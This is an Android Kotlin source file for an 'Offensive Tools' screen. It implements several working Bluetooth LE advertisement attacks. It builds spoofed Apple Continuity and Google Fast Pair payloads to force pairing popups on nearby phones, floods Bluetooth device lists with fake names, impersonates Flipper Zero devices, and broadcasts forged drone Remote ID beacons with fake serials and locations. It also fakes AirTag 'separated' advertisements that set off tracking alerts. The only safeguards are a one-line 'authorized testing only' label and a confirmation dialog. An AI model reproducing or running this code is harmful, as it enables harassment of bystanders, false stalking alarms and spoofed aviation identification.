package com.ghostech.blehound

import android.app.Activity
import android.app.AlertDialog
import android.bluetooth.BluetoothManager
import android.bluetooth.le.AdvertiseCallback
import android.bluetooth.le.AdvertiseSettings
import android.bluetooth.le.BluetoothLeAdvertiser
import android.content.Context
import android.content.pm.PackageManager
import android.graphics.Typeface
import android.graphics.drawable.GradientDrawable
import android.os.Bundle
import android.os.Handler
import android.os.Looper
import android.view.Gravity
import android.widget.Button
import android.widget.LinearLayout
import android.widget.ScrollView
import android.widget.TextView

class OffensiveToolsActivity : Activity() {

    private var advertiser: BluetoothLeAdvertiser? = null
    private var isAttacking = false
    private val handler = Handler(Looper.getMainLooper())
    private var statusText: TextView? = null
    private var packetsText: TextView? = null
    private var packetCount = 0
    private var currentCallback: AdvertiseCallback? = null

    // Apple Continuity ProximityPair device models (2 bytes each)
    private val appleDeviceModels = listOf(
        byteArrayOf(0x0E, 0x20), // AirPods Pro
        byteArrayOf(0x0A, 0x20), // AirPods Max
        byteArrayOf(0x02, 0x20), // AirPods
        byteArrayOf(0x0F, 0x20), // AirPods 2nd Gen
        byteArrayOf(0x13, 0x20), // AirPods 3rd Gen
        byteArrayOf(0x14, 0x20), // AirPods Pro 2nd Gen
        byteArrayOf(0x10, 0x20), // Beats Flex
        byteArrayOf(0x06, 0x20), // Beats Solo 3
        byteArrayOf(0x03, 0x20), // Powerbeats 3
        byteArrayOf(0x0B, 0x20), // Powerbeats Pro
        byteArrayOf(0x0C, 0x20), // Beats Solo Pro
        byteArrayOf(0x11, 0x20), // Beats Studio Buds
        byteArrayOf(0x05, 0x20), // Beats X
        byteArrayOf(0x09, 0x20), // Beats Studio 3
        byteArrayOf(0x17, 0x20), // Beats Studio Pro
        byteArrayOf(0x12, 0x20), // Beats Fit Pro
        byteArrayOf(0x16, 0x20), // Beats Studio Buds+
    )

    private val spamNames = listOf(
        "\uD83D\uDC1D nyanbee", "\uD83D\uDC1D BUZZ BUZZ", "\uD83C\uDF6F Honey Trap",
        "\uD83D\uDC1D Queen Bee", "\uD83D\uDC1D The Hive", "\uD83D\uDC1D Stinger",
        "\uD83D\uDC1D Hivemind", "\uD83D\uDC1D CK42X.COM",
        "Free WiFi", "AirDrop - iPhone", "Galaxy Buds Pro",
        "FBI Van #3", "Crypto Wallet", "Toilet"
    )

    // Bee-themed spam names (BEE SPAM exclusive)
    private val beeSwarmNames = listOf(
        "\uD83D\uDC1D Worker Bee #1", "\uD83D\uDC1D Worker Bee #2", "\uD83D\uDC1D Worker Bee #3",
        "\uD83D\uDC1D Drone Bee", "\uD83D\uDC1D Scout Bee", "\uD83D\uDC1D Guard Bee",
        "\uD83D\uDC1D Queen's Guard", "\uD83D\uDC1D Honey Maker", "\uD83D\uDC1D Pollen Carrier",
        "\uD83D\uDC1D Wax Builder", "\uD83D\uDC1D Hive Inspector", "\uD83D\uDC1D Royal Jelly",
        "\uD83D\uDC1D Stinger Unit", "\uD83D\uDC1D Nectar Ops", "\uD83D\uDC1D Swarm Leader",
        "\uD83D\uDC1D Larva-01", "\uD83D\uDC1D Comb Cell #7", "\uD83D\uDC1D Waggle Dance",
        "\uD83D\uDC1D Propolis Agent", "\uD83D\uDC1D Forager Alpha", "\uD83D\uDC1D Nurse Bee",
        "\uD83D\uDC1D Undertaker Bee", "\uD83D\uDC1D nyanBEE HQ", "\uD83D\uDC1D BZZT BZZT",
        "\uD83C\uDF6F Honeycomb Net", "\uD83C\uDF6F Sweet Sting", "\uD83C\uDF6F Apiary Node",
        "\uD83D\uDC1D CK42X SWARM", "\uD83D\uDC1D BEE HOUND", "\uD83D\uDC1D THE HIVE SEES"
    )

    // Samsung Galaxy BUD models for Sour Droid (Fast Pair service data)
    // Google Fast Pair uses 0xFE2C service UUID with 3-byte model ID
    private val samsungFastPairModels = listOf(
        byteArrayOf(0x10, 0xC3.toByte(), 0x01),  // Galaxy Buds
        byteArrayOf(0xEE.toByte(), 0xFB.toByte(), 0x01),  // Galaxy Buds+
        byteArrayOf(0x58, 0xCB.toByte(), 0x01),  // Galaxy Buds Live
        byteArrayOf(0x01, 0xEE.toByte(), 0x01),  // Galaxy Buds Pro
        byteArrayOf(0x53, 0x1F, 0x01),            // Galaxy Buds2
        byteArrayOf(0xAA.toByte(), 0x10, 0x01),   // Galaxy Buds2 Pro
        byteArrayOf(0xD8.toByte(), 0x0E, 0x01),   // Galaxy Buds FE
        byteArrayOf(0x2D, 0x03, 0x01),            // Pixel Buds A-Series
        byteArrayOf(0x72, 0xEF.toByte(), 0x01),   // Pixel Buds Pro
        byteArrayOf(0x0C, 0x0C, 0x01),            // JBL Flip 6
        byteArrayOf(0xF0.toByte(), 0x09, 0x01),   // JBL Live Pro 2
        byteArrayOf(0x06, 0xB6.toByte(), 0x01),   // Sony WF-1000XM4
        byteArrayOf(0x0B, 0xB4.toByte(), 0x01),   // Sony WH-1000XM5
        byteArrayOf(0x82.toByte(), 0x22, 0x01),   // Nothing Ear (1)
        byteArrayOf(0xF5.toByte(), 0x13, 0x01),   // Nothing Ear (2)
    )

    // Flipper Zero BLE advertisement data (Flipper advertises as HID Keyboard)
    private val flipperNames = listOf(
        "Flipper Pwn1", "Flipper Pwn2", "Flipper Pwn3",
        "Flipper Lab-A", "Flipper Lab-B", "Flipper Lab-C",
        "Flipper X-Ray", "Flipper Ghost", "Flipper Recon",
        "Flipper Badger", "Flipper Shark", "Flipper Viper",
        "Flipper Hydra", "Flipper Zero-0", "Flipper Null"
    )

    // Drone Remote ID broadcast types (per ASTM F3411 / FAA RemoteID)
    private val droneTypes = listOf(
        "DJI Mavic 3", "DJI Mini 4 Pro", "DJI Air 3",
        "Parrot Anafi", "Autel EVO Lite", "Skydio 2+",
        "DJI Avata 2", "DJI FPV Combo", "Holy Stone HS720G",
        "Autel EVO Max", "Parrot Disco", "DJI Matrice 350"
    )

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)

        val btManager = getSystemService(Context.BLUETOOTH_SERVICE) as BluetoothManager
        advertiser = btManager.adapter?.bluetoothLeAdvertiser

        val root = LinearLayout(this).apply {
            orientation = LinearLayout.VERTICAL
            setBackgroundColor(0xFF000000.toInt())
        }

        val header = LinearLayout(this).apply {
            orientation = LinearLayout.VERTICAL
            setPadding(dp(18), dp(24), dp(18), dp(14))
            background = GradientDrawable(
                GradientDrawable.Orientation.TOP_BOTTOM,
                intArrayOf(0xFF2A0000.toInt(), 0xFF140000.toInt(), 0xFF000000.toInt())
            ).apply { setStroke(dp(1), themeColor(this@OffensiveToolsActivity)) }
        }

        val title = TextView(this).apply {
            text = "OFFENSIVE TOOLS"
            gravity = Gravity.CENTER
            textSize = 20f
            typeface = Typeface.create("sans-serif-black", Typeface.BOLD_ITALIC)
            setTextColor(themeColor(this@OffensiveToolsActivity))
        }
        val subtitle = TextView(this).apply {
            text = "BLE advertisement attacks"
            gravity = Gravity.CENTER
            textSize = 11f
            typeface = Typeface.MONOSPACE
            setTextColor(0xFF888888.toInt())
            setPadding(0, dp(4), 0, 0)
        }
        header.addView(title)
        header.addView(subtitle)

        val scroll = ScrollView(this).apply {
            layoutParams = LinearLayout.LayoutParams(
                LinearLayout.LayoutParams.MATCH_PARENT, 0, 1f
            )
        }
        val content = LinearLayout(this).apply {
            orientation = LinearLayout.VERTICAL
            setPadding(dp(16), dp(16), dp(16), dp(24))
        }

        statusText = TextView(this).apply {
            text = "IDLE"
            textSize = 14f
            typeface = Typeface.create(Typeface.MONOSPACE, Typeface.BOLD)
            setTextColor(0xFF44FF44.toInt())
            gravity = Gravity.CENTER
            setPadding(0, dp(8), 0, dp(4))
        }
        packetsText = TextView(this).apply {
            text = "Packets: 0"
            textSize = 11f
            typeface = Typeface.MONOSPACE
            setTextColor(0xFF666666.toInt())
            gravity = Gravity.CENTER
            setPadding(0, 0, 0, dp(12))
        }
        content.addView(statusText)
        content.addView(packetsText)

        val sourAppleBtn = buildAttackButton("SOUR APPLE", "Spoof Apple Continuity popups on nearby iOS devices")
        sourAppleBtn.setOnClickListener { confirmAndRun("Sour Apple") { startSourApple() } }
        content.addView(sourAppleBtn)

        val bleFloodBtn = buildAttackButton("BLE FLOOD", "Flood nearby Bluetooth lists with fake device names")
        bleFloodBtn.setOnClickListener { confirmAndRun("BLE Flood") { startBleFlood() } }
        content.addView(bleFloodBtn)

        val swiftPairBtn = buildAttackButton("SWIFT PAIR", "Trigger Windows/Android pairing popups")
        swiftPairBtn.setOnClickListener { confirmAndRun("Swift Pair") { startSwiftPair() } }
        content.addView(swiftPairBtn)

        val beeSpamBtn = buildAttackButton("BEE SPAM", "30 bee-themed devices flood every BLE list in range")
        beeSpamBtn.setOnClickListener { confirmAndRun("Bee Spam") { startBeeSpam() } }
        content.addView(beeSpamBtn)

        val sourDroidBtn = buildAttackButton("SOUR DROID", "Spoof Fast Pair popups on nearby Android devices")
        sourDroidBtn.setOnClickListener { confirmAndRun("Sour Droid") { startSourDroid() } }
        content.addView(sourDroidBtn)

        val flipperSpamBtn = buildAttackButton("FLIPPER BLE SPAM", "Flood BLE with spoofed Flipper Zero devices")
        flipperSpamBtn.setOnClickListener { confirmAndRun("Flipper BLE Spam") { startFlipperSpam() } }
        content.addView(flipperSpamBtn)

        val droneSpooferBtn = buildAttackButton("DRONE SPOOFER", "Broadcast fake drone Remote ID beacons via BLE")
        droneSpooferBtn.setOnClickListener { confirmAndRun("Drone Spoofer") { startDroneSpoofer() } }
        content.addView(droneSpooferBtn)

        val phantomFloodBtn = buildAttackButton("PHANTOM FLOOD", "Flood area with fake AirTag BLE advertisements")
        phantomFloodBtn.setOnClickListener { confirmAndRun("Phantom Flood") { startPhantomFlood() } }
        content.addView(phantomFloodBtn)

        val stopBtn = Button(this).apply {
            text = "STOP ATTACK"
            isAllCaps = true
            textSize = 14f
            typeface = Typeface.create(Typeface.MONOSPACE, Typeface.BOLD)
            setTextColor(0xFF000000.toInt())
            background = GradientDrawable(
                GradientDrawable.Orientation.TOP_BOTTOM,
                intArrayOf(0xFFFF4444.toInt(), 0xFFCC0000.toInt())
            ).apply { cornerRadius = dp(18).toFloat() }
            setPadding(dp(10), dp(16), dp(10), dp(16))
        }
        stopBtn.setOnClickListener { stopAttack() }
        content.addView(stopBtn)

        content.addView(TextView(this).apply {
            text = "For authorized security testing only."
            textSize = 10f
            typeface = Typeface.MONOSPACE
            setTextColor(0xFF444444.toInt())
            setPadding(0, dp(16), 0, 0)
            gravity = Gravity.CENTER
        })

        scroll.addView(content)

        val backContainer = LinearLayout(this).apply {
            orientation = LinearLayout.VERTICAL
            setPadding(dp(16), dp(0), dp(16), dp(20))
        }
        val backBtn = buildHellButton("BACK")
        backBtn.setOnClickListener { finish() }
        backContainer.addView(backBtn)

        root.addView(header)
        root.addView(scroll)
        root.addView(backContainer)
        setContentView(root)
    }

    private fun confirmAndRun(name: String, action: () -> Unit) {
        if (isAttacking) { stopAttack(); return }
        if (advertiser == null) {
            statusText?.text = "BLE ADVERTISE NOT AVAILABLE"
            statusText?.setTextColor(0xFFFF4444.toInt())
            return
        }
        if (checkSelfPermission(android.Manifest.permission.BLUETOOTH_ADVERTISE) != PackageManager.PERMISSION_GRANTED) {
            requestPermissions(arrayOf(android.Manifest.permission.BLUETOOTH_ADVERTISE), 100)
            return
        }
        AlertDialog.Builder(this)
            .setTitle("Launch $name?")
            .setMessage("This will broadcast BLE advertisements. For authorized testing only.")
            .setNegativeButton("Cancel", null)
            .setPositiveButton("Launch") { _, _ ->
                packetCount = 0
                isAttacking = true
                statusText?.text = "$name ACTIVE"
                statusText?.setTextColor(0xFFFF4444.toInt())
                action()
            }
            .show()
    }

    // Stop current ad, wait, then start new one
    private fun safeAdvertise(data: android.bluetooth.le.AdvertiseData) {
        try {
            // Stop previous
            currentCallback?.let {
                advertiser?.stopAdvertising(it)
            }
        } catch (_: SecurityException) {}

        currentCallback = object : AdvertiseCallback() {
            override fun onStartSuccess(settingsInEffect: AdvertiseSettings?) {
                runOnUiThread {
                    packetCount++
                    packetsText?.text = "Packets: $packetCount"
                }
            }
            override fun onStartFailure(errorCode: Int) {
                runOnUiThread {
                    packetsText?.text = "Error code: $errorCode (${errorName(errorCode)})"
                }
            }
        }

        val settings = AdvertiseSettings.Builder()
            .setAdvertiseMode(AdvertiseSettings.ADVERTISE_MODE_LOW_LATENCY)
            .setTxPowerLevel(AdvertiseSettings.ADVERTISE_TX_POWER_HIGH)
            .setConnectable(false)
            .setTimeout(0)
            .build()

        try {
            advertiser?.startAdvertising(settings, data, currentCallback)
        } catch (_: SecurityException) {
            statusText?.text = "PERMISSION DENIED"
            isAttacking = false
        }
    }

    private fun errorName(code: Int) = when(code) {
        1 -> "DATA_TOO_LARGE"
        2 -> "TOO_MANY_ADVERTISERS"
        3 -> "ALREADY_STARTED"
        4 -> "INTERNAL_ERROR"
        5 -> "FEATURE_UNSUPPORTED"
        else -> "UNKNOWN"
    }

    // ─── SOUR APPLE ───
    // Format from simondankelmann/Bluetooth-LE-Spam (proven working)
    // Continuity type 0x07 = ProximityPair
    // Payload: type(1) + size(1) + prefix(1) + device(2) + status(1) + battery(1) + case(1) + lid(1) + color(1) + 00 + random(16)
    private fun startSourApple() {
        val runnable = object : Runnable {
            override fun run() {
                if (!isAttacking) return

                val device = appleDeviceModels.random()
                val rand = java.util.Random()

                val payload = ByteArray(27)
                payload[0] = 0x07                              // Continuity type: ProximityPair
                payload[1] = 0x19                              // Payload size: 25
                payload[2] = 0x07                              // Prefix: NEW DEVICE
                payload[3] = device[0]                         // Device model byte 1
                payload[4] = device[1]                         // Device model byte 2
                payload[5] = 0x55                              // Status
                payload[6] = ((rand.nextInt(10) shl 4) or rand.nextInt(10)).toByte()  // Buds battery
                payload[7] = ((rand.nextInt(8) shl 4) or rand.nextInt(10)).toByte()   // Case battery
                payload[8] = rand.nextInt(256).toByte()        // Lid open counter
                payload[9] = 0x00                              // Color
                payload[10] = 0x00                             // Padding
                // Fill remaining 16 bytes with random data
                for (i in 11 until 27) payload[i] = rand.nextInt(256).toByte()

                val data = BleAdvertiseHelper.buildManufacturerData(0x004C, payload)
                safeAdvertise(data)

                handler.postDelayed(this, 1500) // 1.5 sec per ad, iOS needs time to process
            }
        }
        handler.post(runnable)
    }

    // ─── BLE FLOOD ───
    private fun startBleFlood() {
        val runnable = object : Runnable {
            override fun run() {
                if (!isAttacking) return

                val name = spamNames.random()
                try {
                    val adapter = (getSystemService(Context.BLUETOOTH_SERVICE) as BluetoothManager).adapter
                    adapter?.setName(name.take(20))
                } catch (_: SecurityException) {}

                val settings = AdvertiseSettings.Builder()
                    .setAdvertiseMode(AdvertiseSettings.ADVERTISE_MODE_LOW_LATENCY)
                    .setTxPowerLevel(AdvertiseSettings.ADVERTISE_TX_POWER_HIGH)
                    .setConnectable(false)
                    .setTimeout(0)
                    .build()

                val data = android.bluetooth.le.AdvertiseData.Builder()
                    .setIncludeDeviceName(true)
                    .setIncludeTxPowerLevel(false)
                    .build()

                try {
                    currentCallback?.let { advertiser?.stopAdvertising(it) }
                } catch (_: SecurityException) {}

                currentCallback = object : AdvertiseCallback() {
                    override fun onStartSuccess(settingsInEffect: AdvertiseSettings?) {
                        runOnUiThread {
                            packetCount++
                            packetsText?.text = "Packets: $packetCount | $name"
                        }
                    }
                    override fun onStartFailure(errorCode: Int) {
                        runOnUiThread { packetsText?.text = "Error: ${errorName(errorCode)}" }
                    }
                }

                try {
                    advertiser?.startAdvertising(settings, data, currentCallback)
                } catch (_: SecurityException) {
                    statusText?.text = "PERMISSION DENIED"
                    isAttacking = false
                }

                handler.postDelayed(this, 500)
            }
        }
        handler.post(runnable)
    }

    // ─── SWIFT PAIR ───
    private fun startSwiftPair() {
        val runnable = object : Runnable {
            override fun run() {
                if (!isAttacking) return

                val mfgData = byteArrayOf(
                    0x03, 0x00, 0x80.toByte(), 0x00,
                    (Math.random() * 256).toInt().toByte(),
                    (Math.random() * 256).toInt().toByte()
                )

                val data = BleAdvertiseHelper.buildManufacturerData(0x0006, mfgData)
                safeAdvertise(data)

                handler.postDelayed(this, 300)
            }
        }
        handler.post(runnable)
    }

    // ─── BEE SPAM ───
    // 30 bee-themed device names flooding every BLE list in range
    // Signature nyanBEE swarm attack
    private fun startBeeSpam() {
        val runnable = object : Runnable {
            override fun run() {
                if (!isAttacking) return

                val name = beeSwarmNames.random()
                try {
                    val adapter = (getSystemService(Context.BLUETOOTH_SERVICE) as BluetoothManager).adapter
                    adapter?.setName(name.take(20))
                } catch (_: SecurityException) {}

                val data = android.bluetooth.le.AdvertiseData.Builder()
                    .setIncludeDeviceName(true)
                    .setIncludeTxPowerLevel(false)
                    .build()

                try {
                    currentCallback?.let { advertiser?.stopAdvertising(it) }
                } catch (_: SecurityException) {}

                currentCallback = object : AdvertiseCallback() {
                    override fun onStartSuccess(settingsInEffect: AdvertiseSettings?) {
                        runOnUiThread {
                            packetCount++
                            packetsText?.text = "Bees: $packetCount | $name"
                        }
                    }
                    override fun onStartFailure(errorCode: Int) {
                        runOnUiThread { packetsText?.text = "Error: ${errorName(errorCode)}" }
                    }
                }

                val settings = AdvertiseSettings.Builder()
                    .setAdvertiseMode(AdvertiseSettings.ADVERTISE_MODE_LOW_LATENCY)
                    .setTxPowerLevel(AdvertiseSettings.ADVERTISE_TX_POWER_HIGH)
                    .setConnectable(false)
                    .setTimeout(0)
                    .build()

                try {
                    advertiser?.startAdvertising(settings, data, currentCallback)
                } catch (_: SecurityException) {
                    statusText?.text = "PERMISSION DENIED"
                    isAttacking = false
                }

                handler.postDelayed(this, 400)
            }
        }
        handler.post(runnable)
    }

    // ─── SOUR DROID ───
    // Google Fast Pair spam: triggers pairing popups on Android devices
    // Uses 0xFE2C service UUID with 3-byte model IDs
    // Based on simondankelmann/Bluetooth-LE-Spam Samsung/Google Fast Pair implementation
    private fun startSourDroid() {
        val runnable = object : Runnable {
            override fun run() {
                if (!isAttacking) return

                val model = samsungFastPairModels.random()
                val rand = java.util.Random()

                // Fast Pair service data: flags + model ID + random salt
                val serviceData = ByteArray(6)
                serviceData[0] = 0x00                      // Flags
                serviceData[1] = model[0]                  // Model ID byte 1
                serviceData[2] = model[1]                  // Model ID byte 2
                serviceData[3] = model[2]                  // Model ID byte 3
                serviceData[4] = rand.nextInt(256).toByte() // Salt
                serviceData[5] = rand.nextInt(256).toByte() // Salt

                val serviceUuid = android.os.ParcelUuid.fromString("0000FE2C-0000-1000-8000-00805F9B34FB")

                val data = android.bluetooth.le.AdvertiseData.Builder()
                    .setIncludeDeviceName(false)
                    .setIncludeTxPowerLevel(false)
                    .addServiceData(serviceUuid, serviceData)
                    .build()

                safeAdvertise(data)

                handler.postDelayed(this, 1000) // 1s per ad, Android needs processing time
            }
        }
        handler.post(runnable)
    }

    // ─── FLIPPER BLE SPAM ───
    // Floods BLE with spoofed Flipper Zero devices
    // Inspired by JustCallMeKoko's ESP32 Marauder BLE spam module
    // Flipper advertises as HID device with specific appearance bytes
    private fun startFlipperSpam() {
        val runnable = object : Runnable {
            override fun run() {
                if (!isAttacking) return

                val name = flipperNames.random()
                try {
                    val adapter = (getSystemService(Context.BLUETOOTH_SERVICE) as BluetoothManager).adapter
                    adapter?.setName(name.take(20))
                } catch (_: SecurityException) {}

                // Flipper uses HID keyboard appearance (0x03C1) and HID service UUID (0x1812)
                val hidServiceUuid = android.os.ParcelUuid.fromString("00001812-0000-1000-8000-00805F9B34FB")

                val data = android.bluetooth.le.AdvertiseData.Builder()
                    .setIncludeDeviceName(true)
                    .setIncludeTxPowerLevel(false)
                    .addServiceUuid(hidServiceUuid)
                    .build()

                try {
                    currentCallback?.let { advertiser?.stopAdvertising(it) }
                } catch (_: SecurityException) {}

                currentCallback = object : AdvertiseCallback() {
                    override fun onStartSuccess(settingsInEffect: AdvertiseSettings?) {
                        runOnUiThread {
                            packetCount++
                            packetsText?.text = "Flippers: $packetCount | $name"
                        }
                    }
                    override fun onStartFailure(errorCode: Int) {
                        runOnUiThread { packetsText?.text = "Error: ${errorName(errorCode)}" }
                    }
                }

                val settings = AdvertiseSettings.Builder()
                    .setAdvertiseMode(AdvertiseSettings.ADVERTISE_MODE_LOW_LATENCY)
                    .setTxPowerLevel(AdvertiseSettings.ADVERTISE_TX_POWER_HIGH)
                    .setConnectable(true) // Flipper is connectable HID
                    .setTimeout(0)
                    .build()

                try {
                    advertiser?.startAdvertising(settings, data, currentCallback)
                } catch (_: SecurityException) {
                    statusText?.text = "PERMISSION DENIED"
                    isAttacking = false
                }

                handler.postDelayed(this, 500)
            }
        }
        handler.post(runnable)
    }

    // ─── DRONE SPOOFER ───
    // Broadcasts fake drone Remote ID beacons via BLE
    // Per ASTM F3411-22a / FAA Remote ID rule, drones broadcast identity via BLE 4/5
    // Uses 0xFFFA service UUID (ASTM Remote ID) with spoofed drone data
    private fun startDroneSpoofer() {
        val runnable = object : Runnable {
            override fun run() {
                if (!isAttacking) return

                val rand = java.util.Random()
                val droneType = droneTypes.random()

                // ASTM F3411 Remote ID message: Basic ID (type 0x00)
                // Message type (4 bits) + protocol version (4 bits) + ID type + UAS ID (20 bytes)
                val remoteIdData = ByteArray(25)
                remoteIdData[0] = 0x00  // Message type 0 = Basic ID, protocol version 0
                remoteIdData[1] = 0x01  // ID type 1 = Serial Number (CAA assigned)

                // Generate random serial number (20 chars, ASCII encoded)
                val serial = "SPOOF${rand.nextInt(99999)}${rand.nextInt(99999)}"
                val serialBytes = serial.toByteArray(Charsets.US_ASCII)
                System.arraycopy(serialBytes, 0, remoteIdData, 2, minOf(serialBytes.size, 20))

                // Location/Vector message: type 0x10
                val locationData = ByteArray(25)
                locationData[0] = 0x10  // Message type 1 = Location, protocol version 0
                locationData[1] = 0x00  // Status: undeclared
                // Latitude: ~39.6 (Allentown area, randomized)
                val lat = (39.6 + rand.nextDouble() * 0.2)
                val latInt = (lat * 1e7).toInt()
                locationData[2] = (latInt shr 24).toByte()
                locationData[3] = (latInt shr 16).toByte()
                locationData[4] = (latInt shr 8).toByte()
                locationData[5] = latInt.toByte()
                // Longitude: ~-75.5 (randomized)
                val lon = (-75.5 + rand.nextDouble() * 0.2)
                val lonInt = (lon * 1e7).toInt()
                locationData[6] = (lonInt shr 24).toByte()
                locationData[7] = (lonInt shr 16).toByte()
                locationData[8] = (lonInt shr 8).toByte()
                locationData[9] = lonInt.toByte()
                // Altitude: 50-300m
                val alt = (50 + rand.nextInt(250))
                locationData[10] = (alt shr 8).toByte()
                locationData[11] = alt.toByte()

                // Use ASTM RemoteID service UUID 0xFFFA
                val remoteIdUuid = android.os.ParcelUuid.fromString("0000FFFA-0000-1000-8000-00805F9B34FB")

                val data = android.bluetooth.le.AdvertiseData.Builder()
                    .setIncludeDeviceName(false)
                    .setIncludeTxPowerLevel(false)
                    .addServiceData(remoteIdUuid, remoteIdData)
                    .build()

                safeAdvertise(data)

                runOnUiThread {
                    packetsText?.text = "Drone: $packetCount | $droneType"
                }

                handler.postDelayed(this, 800)
            }
        }
        handler.post(runnable)
    }

    // ─── PHANTOM FLOOD (AirTag Spam) ───
    // Floods area with fake Apple AirTag (Find My) BLE advertisements
    // Inspired by HaleHound CYD firmware's Phantom Flood attack
    // Apple Find My uses manufacturer data 0x004C with type 0x12 (FindMy)
    private fun startPhantomFlood() {
        val runnable = object : Runnable {
            override fun run() {
                if (!isAttacking) return

                val rand = java.util.Random()

                // Apple Find My advertisement (AirTag format)
                // Type 0x12 = Find My, Length varies
                // Contains: status, public key fragment, hint byte
                val payload = ByteArray(29)
                payload[0] = 0x12           // Continuity type: Find My
                payload[1] = 0x19           // Payload size: 25
                payload[2] = 0x10           // Status: separated (triggers "AirTag detected" alerts)
                // 22 bytes of random public key data (makes each ad look like a unique AirTag)
                for (i in 3 until 25) payload[i] = rand.nextInt(256).toByte()
                // Hint byte
                payload[25] = rand.nextInt(4).toByte()
                // Additional random bytes
                payload[26] = rand.nextInt(256).toByte()
                payload[27] = rand.nextInt(256).toByte()
                payload[28] = rand.nextInt(256).toByte()

                val data = BleAdvertiseHelper.buildManufacturerData(0x004C, payload)
                safeAdvertise(data)

                handler.postDelayed(this, 600) // Slightly slower to let iOS process each "unique" tag
            }
        }
        handler.post(runnable)
    }

    private fun stopAttack() {
        isAttacking = false
        handler.removeCallbacksAndMessages(null)
        try {
            currentCallback?.let { advertiser?.stopAdvertising(it) }
        } catch (_: SecurityException) {}
        currentCallback = null
        statusText?.text = "STOPPED"
        statusText?.setTextColor(0xFF44FF44.toInt())
    }

    override fun onDestroy() {
        stopAttack()
        super.onDestroy()
    }

    override fun onRequestPermissionsResult(requestCode: Int, permissions: Array<String>, grantResults: IntArray) {
        if (requestCode == 100 && grantResults.isNotEmpty() && grantResults[0] == PackageManager.PERMISSION_GRANTED) {
            statusText?.text = "PERMISSION GRANTED. TAP AGAIN."
            statusText?.setTextColor(0xFF44FF44.toInt())
        }
    }

    private fun buildAttackButton(label: String, desc: String): LinearLayout {
        val container = LinearLayout(this).apply {
            orientation = LinearLayout.VERTICAL
            background = GradientDrawable(
                GradientDrawable.Orientation.TOP_BOTTOM,
                intArrayOf(0xFF4A0000.toInt(), 0xFF1A0000.toInt())
            ).apply {
                cornerRadius = dp(18).toFloat()
                setStroke(dp(1), themeColor(this@OffensiveToolsActivity))
            }
            setPadding(dp(16), dp(14), dp(16), dp(14))
            val lp = LinearLayout.LayoutParams(
                LinearLayout.LayoutParams.MATCH_PARENT,
                LinearLayout.LayoutParams.WRAP_CONTENT
            )
            lp.setMargins(0, 0, 0, dp(8))
            layoutParams = lp
            isClickable = true
            isFocusable = true
        }
        container.addView(TextView(this).apply {
            text = label
            textSize = 14f
            typeface = Typeface.create(Typeface.MONOSPACE, Typeface.BOLD)
            setTextColor(0xFFFFF1E0.toInt())
        })
        container.addView(TextView(this).apply {
            text = desc
            textSize = 10f
            typeface = Typeface.MONOSPACE
            setTextColor(0xFF888888.toInt())
            setPadding(0, dp(2), 0, 0)
        })
        return container
    }

    private fun buildHellButton(label: String) = Button(this).apply {
        text = label
        isAllCaps = true
        textSize = 13f
        typeface = Typeface.create(Typeface.MONOSPACE, Typeface.BOLD)
        setTextColor(0xFFFFF1E0.toInt())
        background = GradientDrawable(
            GradientDrawable.Orientation.TOP_BOTTOM,
            intArrayOf(0xFF6A0000.toInt(), 0xFF260000.toInt())
        ).apply {
            cornerRadius = dp(18).toFloat()
            setStroke(dp(1), themeColor(this@OffensiveToolsActivity))
        }
        setPadding(dp(10), dp(14), dp(10), dp(14))
    }

    private fun dp(value: Int): Int = (value * resources.displayMetrics.density).toInt()
}
